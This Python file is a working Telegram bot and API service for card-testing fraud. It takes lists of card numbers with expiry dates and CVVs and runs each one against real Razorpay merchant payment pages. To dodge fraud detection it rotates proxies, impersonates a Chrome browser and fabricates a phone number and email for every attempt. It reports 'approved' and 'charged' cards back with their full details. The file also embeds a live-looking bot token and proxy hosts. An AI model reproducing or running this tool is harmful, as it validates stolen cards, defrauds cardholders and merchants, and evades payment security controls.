import asyncio
import json
import time
import re
import random
import hashlib
import uuid
import logging
import os
from threading import Thread
from fastapi import FastAPI, HTTPException
from pydantic import BaseModel
import uvicorn

from curl_cffi.requests import AsyncSession

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    ContextTypes,
    MessageHandler,
    CommandHandler,
    filters,
    CallbackQueryHandler
)

TELEGRAM_BOT_TOKEN = "8031306974:AAFUlWwpvWDSeFDM3pjvDDv0_vo2l95wk5U"

RAW_PROXIES = [
    "px241104.pointtoserver.com:10780",
    "px400501.pointtoserver.com:10780",
    "px023005.pointtoserver.com:10780",
]

RAZORPAY_URLS = [
    "https://razorpay.me/@onsiteteams",
    "https://razorpay.me/@getitservice",
    "https://pages.razorpay.com/payonline",
    "https://razorpay.me/@plp",
    "https://axiseasypay.razorpay.com/wallets/"
]

proxy_index = 0
url_index = 0
dead_proxies = set()

logging.basicConfig(format="%(asctime)s | %(levelname)s | %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

api_app = FastAPI(title="Razorpay Persistent Strict API", version="9.1")

class CardRequest(BaseModel):
    cc: str
    mm: str
    yy: str
    cvv: str
    amount: int = 1

def format_proxy(raw):
    raw = raw.strip()
    if not raw: return None
    if "://" not in raw:
        parts = raw.split(":")
        if len(parts) == 4: return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        elif len(parts) == 2: return f"http://{raw}"
    return raw

def get_strict_proxy():
    global proxy_index
    if not RAW_PROXIES: return None
    p = RAW_PROXIES[proxy_index % len(RAW_PROXIES)]
    proxy_index += 1
    return format_proxy(p)

def get_rotating_url():
    global url_index
    u = RAZORPAY_URLS[url_index % len(RAZORPAY_URLS)]
    url_index += 1
    return u

def extract_embedded_json(text):
    tag = "var data ="
    pos = text.find(tag)
    if pos != -1:
        start = pos + len(tag)
        while start < len(text) and text[start] in [' ', '\t', '\n', '\r']: start += 1
        if start < len(text) and text[start] == '{':
            depth, in_str, escaped = 0, False, False
            for i in range(start, len(text)):
                c = text[i]
                if escaped: escaped = False; continue
                if c == '\\' and in_str: escaped = type(not escaped) and False; continue
                if c == '"': in_str = not in_str; continue
                if in_str: continue
                if c == '{': depth += 1
                elif c == '}':
                    depth -= 1
                    if depth == 0: return text[start:i+1]

    key_match = re.search(r'["\']key_id["\']\s*:\s*["\'](rzp_live_[a-zA-Z0-9]+)["\']', text)
    link_match = re.search(r'["\']id["\']\s*:\s*["\'](plink_[a-zA-Z0-9]+)["\']', text)
    item_match = re.search(r'["\']payment_page_item_id["\']\s*:\s*["\'](ppgi_[a-zA-Z0-9]+)["\']', text)
    
    if key_match:
        simulated_json = {
            "key_id": key_match.group(1),
            "payment_link": {
                "id": link_match.group(1) if link_match else "plink_dummy",
                "payment_page_items": [{"id": item_match.group(1) if item_match else "ppgi_dummy"}]
            },
            "keyless_header": ""
        }
        return json.dumps(simulated_json)

    return None

async def fetch_dynamic_builds(session, proxy_url):
    try:
        resp = await session.get(
            "https://api.razorpay.com/v1/checkout/public?traffic_env=production&checkout_v2=1",
            proxy=proxy_url,
            impersonate="chrome120",
            timeout=20
        )
        text = resp.text
        build_match = re.search(r'build[\'"]?\s*[:=]\s*[\'"]([a-fA-F0-9]{32,})[\'"]', text)
        build_v1_match = re.search(r'build_v1[\'"]?\s*[:=]\s*[\'"]([a-fA-F0-9]{32,})[\'"]', text)
        return (
            build_match.group(1) if build_match else "9cb57fdf457e44eac4384e182f925070ff5488d9",
            build_v1_match.group(1) if build_v1_match else "715e3c0a534a4e4fa59a19e1d2a3cc3daf1837e2"
        )
    except Exception:
        return "9cb57fdf457e44eac4384e182f925070ff5488d9", "715e3c0a534a4e4fa59a19e1d2a3cc3daf1837e2"

async def process_card_pipeline_with_logs(cc, mm, yy, cvv, amount=1, status_callback=None):
    phone = "+91" + random.choice(["6", "7", "8", "9"]) + "".join([str(random.randint(0, 9)) for _ in range(9)])
    email = f"user_{random.randint(1000,9999)}@gmail.com"

    yy_formatted = yy[2:] if len(yy) == 4 else yy
    year = int("20" + yy_formatted)
    amount_paise = amount * 100

    device_id = f"1.{hashlib.sha1(uuid.uuid4().bytes).hexdigest()}.{int(time.time()*1000)}.{random.randint(0,99999999):08d}"
    session_id = "".join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=14))

    async def notify(proxy_st, api_st, gw_resp):
        if status_callback:
            await status_callback(proxy_st, api_st, gw_resp)

    # Strict Rotation Across Sites & Proxies
    max_attempts = len(RAZORPAY_URLS)
    for _ in range(max_attempts):
        current_proxy = get_strict_proxy()
        proxy_short = current_proxy.split("@")[-1].split(":")[0] if current_proxy else "PROXY"
        target_url = get_rotating_url()
        site_name = target_url.split("//")[-1].split("/")[0][:15]

        try:
            await notify(f"({proxy_short})", f"Site: {site_name}", "Init")
            
            async with AsyncSession(impersonate="chrome120") as session:
                
                async def proxy_request(method, url, **kwargs):
                    return await session.request(method, url, proxy=current_proxy, timeout=25, **kwargs)

                # Pre-flight warm-up
                await proxy_request("GET", target_url)

                resp = await proxy_request("GET", target_url)
                if resp.status_code != 200:
                    continue
                
                html_body = resp.text
                config_json = extract_embedded_json(html_body)
                if not config_json:
                    continue

                parsed = json.loads(config_json)
                key_id = parsed.get("key_id")
                if not key_id:
                    continue

                link_id, item_id = "", ""
                for k in ["payment_link", "payment_page"]:
                    if k in parsed and isinstance(parsed[k], dict):
                        link_id = parsed[k].get("id")
                        items = parsed[k].get("payment_page_items", [])
                        if items: item_id = items[0].get("id")
                        break

                if not link_id:
                    continue

                await notify(f"({proxy_short})", "Page Parsed!", "Creating Order...")
                keyless_hdr = parsed.get("keyless_header", "")

                BUILD, BUILD_V1 = await fetch_dynamic_builds(session, current_proxy)

                order_payload = {
                    "notes": {"comment": "", "name": "User"},
                    "line_items": [{"payment_page_item_id": item_id, "amount": amount_paise}]
                }
                order_resp = await proxy_request(
                    "POST", f"https://api.razorpay.com/v1/payment_pages/{link_id}/order",
                    json=order_payload,
                    headers={"Origin": "https://pages.razorpay.com", "Referer": "https://pages.razorpay.com/"}
                )
                order_res = order_resp.json()

                order_obj = order_res.get("order", {})
                order_id = order_obj.get("id")
                if not order_id:
                    continue

                checkout_ref = order_id.split("_")[1] if "_" in order_id else order_id
                currency = order_obj.get("currency", "INR")

                await notify(f"({proxy_short})", "Order Created!", "Getting Token...")

                token_params = {
                    "traffic_env": "production", "build": BUILD, "build_v1": BUILD_V1,
                    "checkout_v2": "1", "new_session": "1", "keyless_header": keyless_hdr,
                    "rzp_device_id": device_id, "unified_session_id": session_id
                }
                token_resp = await proxy_request("GET", "https://api.razorpay.com/v1/checkout/public", params=token_params)
                public_text = token_resp.text

                token_match = re.search(r'session_token[\'"]?\s*[:=]\s*[\'"]([A-F0-9]{40,})[\'"]', public_text, re.IGNORECASE)
                if not token_match: token_match = re.search(r'window\.session_token="([^"]+)"', public_text)
                if not token_match:
                    continue
                
                session_token = token_match.group(1)
                referer_url = f"https://api.razorpay.com/v1/checkout/public?traffic_env=production&build={BUILD}&build_v1={BUILD_V1}&checkout_v2=1&new_session=1&unified_session_id={session_id}&session_token={session_token}"

                await notify(f"({proxy_short})", "Submitting Card (Ajax)...", "Checking CC...")

                form_data = {
                    "notes[comment]": "", "notes[email]": email, "notes[phone]": phone[3:], "notes[name]": "User",
                    "payment_link_id": link_id, "key_id": key_id, "contact": phone, "email": email,
                    "currency": currency, "_[integration]": "payment_pages", "_[checkout_id]": checkout_ref,
                    "_[device.id]": device_id, "_[library]": "checkoutjs", "_[platform]": "browser",
                    "amount": str(amount_paise), "order_id": order_id, "method": "card",
                    "card[number]": cc, "card[cvv]": cvv, "card[name]": "User",
                    "card[expiry_month]": mm, "card[expiry_year]": str(year), "save": "0", "dcc_currency": currency
                }

                ajax_headers = {
                    "Origin": "https://api.razorpay.com", "Referer": referer_url,
                    "x-session-token": session_token, "Content-Type": "application/x-www-form-urlencoded"
                }

                pay_resp = await proxy_request(
                    "POST", f"https://api.razorpay.com/v1/standard_checkout/payments/create/ajax?x_entity_id={order_id}&session_token={session_token}&keyless_header={keyless_hdr}",
                    data=form_data, headers=ajax_headers
                )
                payment_res = pay_resp.json()

                payment_id = payment_res.get("payment_id") or payment_res.get("id")
                if not payment_id:
                    err_block = payment_res.get("error", {})
                    err_desc = err_block.get("description", "Declined")
                    err_reason = err_block.get("reason", "")
                    reason_full = f"{err_desc} ({err_reason})" if err_reason else err_desc
                    
                    desc_lower = err_desc.lower()
                    if any(k in desc_lower for k in ["insufficient account balance", "insufficient funds", "limit"]) or "incorrect_cvv" in err_reason.lower():
                        await notify(f"({proxy_short})", "Gateway Response", f"Approved: {reason_full}")
                        return {"status": "approved", "response": reason_full, "proxy": proxy_short}
                    
                    await notify(f"({proxy_short})", "Gateway Response", f"Declined: {reason_full}")
                    return {"status": "declined", "response": reason_full, "proxy": proxy_short}

                await notify(f"({proxy_short})", "Gateway Response", "Charged Successfully!")
                return {"status": "charged", "response": "Payment Successful", "proxy": proxy_short}

        except Exception as e:
            logger.warning(f"⚠️ Attempt failed: {str(e)[:30]}. Retrying same card...")
            continue

    return {"status": "error", "response": "Network error / Proxy timeout", "proxy": "PROXY"}

@api_app.post("/api/check")
async def api_check(req: CardRequest):
    return await process_card_pipeline_with_logs(req.cc, req.mm, req.yy, req.cvv, req.amount)

async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "⚡ **Razorpay Strict Persistent Bot Active**\n\n"
        "• Will not skip cards on network error. Retries until checked.\n"
        "• Send a single card or `.txt` file with `/msa`.",
        parse_mode="Markdown"
    )

def format_time(sec):
    m, s = divmod(sec, 60)
    return f"{m}m {s}s" if m > 0 else f"{s}s"

async def msa_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    doc = update.message.document or (update.message.reply_to_message and update.message.reply_to_message.document)
    if not doc:
        await update.message.reply_text("⚠️ Please send or reply to a `.txt` file with `/msa`.")
        return

    status_msg = await update.message.reply_text("📂 Initializing Persistent Console...")

    try:
        file = await context.bot.get_file(doc.file_id)
        lines = (await file.download_as_bytearray()).decode('utf-8', errors='ignore').splitlines()
        cards = []
        for line in lines:
            line = line.strip()
            if not line: continue
            for sep in ["|", "/", " "]:
                p = line.split(sep)
                if len(p) >= 4:
                    cards.append((p[0], p[1], p[2], p[3]))
                    break
    except Exception as e:
        await status_msg.edit_text(f"⚠️ Error reading file: {e}")
        return

    total = len(cards)
    start_time = time.time()
    approved, charged, dead, errors = 0, 0, 0, 0
    
    current_proxy_status = "Connecting..."
    current_api_status = "Initializing..."
    current_gateway_response = "Waiting..."
    username = f"@{update.effective_user.username}" if update.effective_user.username else "User"

    for idx, (cc, mm, yy, cvv) in enumerate(cards, 1):
        masked_cc = f"{cc[:6]}******{cc[-4:]}"
        
        async def update_screen(proxy_st, api_st, gw_resp):
            nonlocal current_proxy_status, current_api_status, current_gateway_response
            current_proxy_status = proxy_st
            current_api_status = api_st
            current_gateway_response = gw_resp
            time_elapsed = int(time.time() - start_time)
            
            console_text = (
                f"╔════════════════════════════════════╗\n"
                f"║ 🟢 PERSISTENT CHECKER CONSOLE      ║\n"
                f"╠════════════════════════════════════╣\n"
                f"║ 📊 Progress  : {idx}/{total:<19} ║\n"
                f"║ 🛡️ Proxy IP  : {current_proxy_status:<19} ║\n"
                f"║ 🔗 API Hit   : {current_api_status:<19} ║\n"
                f"║ 💳 Card Proc : {masked_cc:<19} ║\n"
                f"║ 💬 Gateway   : {current_gateway_response[:17]:<17} ║\n"
                f"║ ⏱️ Elapsed   : {format_time(time_elapsed):<19} ║\n"
                f"╠════════════════════════════════════╣\n"
                f"║ ⭐ Approved: {approved:<5} | 💳 Charged: {charged:<5} ║\n"
                f"║ ❌ Dead    : {dead:<5}  | ⚠️ Errors  : {errors:<5} ║\n"
                f"╚════════════════════════════════════╝"
            )
            try:
                await status_msg.edit_text(f"```text\n{console_text}\n```", parse_mode="Markdown")
            except:
                pass

        # STRICT PERSISTENT LOOP: Jab tak card ka final gateway response na mile, ye card aage nahi badhega!
        while True:
            await update_screen("Connecting...", "Preparing Request...", "Checking...")
            res = await process_card_pipeline_with_logs(cc, mm, yy, cvv, status_callback=update_screen)
            status, resp_msg, proxy_used = res["status"], res["response"], res["proxy"]

            if status == "error":
                errors += 1
                await update_screen(f"({proxy_used})", "Network Error - Retrying CC...", "Rechecking...")
                await asyncio.sleep(1.5)  # Thoda safe pause dekar wahi card dobara try karega
                continue  # Skip nahi karega, same card repeat hoga!
            
            if status == "charged":
                charged += 1
                approved += 1
            elif status == "approved":
                approved += 1
            elif status == "declined":
                dead += 1
            
            break  # Jab real response mil jayega tabhi agle card par jayega

        if status in ["charged", "approved"]:
            await update.message.reply_text(
                f"◎  **{status.capitalize()} · Razorpay UHQ**\n"
                f"━━━━━━━━━━━━━━━━━\n"
                f"▸ num  · `{cc}|{mm}|{yy}|{cvv}`\n"
                f"▸ gate · Razorpay Multi-Site\n"
                f"▸ resp · {resp_msg}\n"
                f"▸ user · {username}\n"
                f"━━━━━━━━━━━━━━━━━\n"
                f"▸ proxy· {proxy_used}",
                parse_mode="Markdown"
            )

        await asyncio.sleep(0.5)

    final_text = (
        f"╔════════════════════════════════════╗\n"
        f"║ 🏁 CHECKING SESSION FINISHED 🏁    ║\n"
        f"╠════════════════════════════════════╣\n"
        f"║ 📊 Total Checked: {total:<19} ║\n"
        f"║ ⭐ Approved    : {approved:<19} ║\n"
        f"║ 💳 Charged     : {charged:<19} ║\n"
        f"║ ❌ Dead        : {dead:<19} ║\n"
        f"║ ⚠️ Errors      : {errors:<19} ║\n"
        f"║ 🕒 Total Time  : {format_time(int(time.time() - start_time)):<19} ║\n"
        f"╚════════════════════════════════════╝"
    )
    await status_msg.edit_text(f"```text\n{final_text}\n```", parse_mode="Markdown")

async def handle_single_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message or not update.message.text or update.message.text.startswith('/'):
        return

    raw = update.message.text.strip()
    parts = None
    for sep in ["|", "/", " "]:
        p = raw.split(sep)
        if len(p) >= 4:
            parts = p
            break

    if not parts: return

    cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
    username = f"@{update.effective_user.username}" if update.effective_user.username else "User"

    wait_msg = await update.message.reply_text(f"⏳ Processing single card persistently...", parse_mode="Markdown")

    async def single_update(p_st, a_st, g_resp):
        try:
            await wait_msg.edit_text(f"⚡ **Status:** Proxy: `{p_st}` | API: `{a_st}` | Resp: `{g_resp}`", parse_mode="Markdown")
        except: pass

    while True:
        res = await process_card_pipeline_with_logs(cc, mm, yy, cvv, status_callback=single_update)
        status, resp_msg, proxy_used = res["status"], res["response"], res["proxy"]
        if status != "error":
            break
        await asyncio.sleep(1.5)

    if status in ["charged", "approved"]:
        reply = (
            f"◎  **{status.capitalize()} · Razorpay UHQ**\n"
            f"━━━━━━━━━━━━━━━━━\n"
            f"▸ num  · `{cc}|{mm}|{yy}|{cvv}`\n"
            f"▸ gate · Razorpay Multi-Site\n"
            f"▸ resp · {resp_msg}\n"
            f"▸ user · {username}\n"
            f"━━━━━━━━━━━━━━━━━\n"
            f"▸ proxy· {proxy_used}"
        )
        await wait_msg.edit_text(reply, parse_mode="Markdown")
    else:
        await wait_msg.edit_text(f"ⓧ **Declined / Dead**\n▸ num: `{cc}|{mm}|{yy}|{cvv}`\n▸ resp: {resp_msg}", parse_mode="Markdown")

def run_fastapi_server():
    uvicorn.run(api_app, host="0.0.0.0", port=int(os.getenv("PORT", 7070)), log_level="warning")

def main():
    server_thread = Thread(target=run_fastapi_server, daemon=True)
    server_thread.start()

    app = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CommandHandler("msa", msa_cmd))
    app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_single_card))
    
    logger.info("Starting Persistent Strict Bot + API Engine...")
    app.run_polling()

if __name__ == "__main__":
    main()
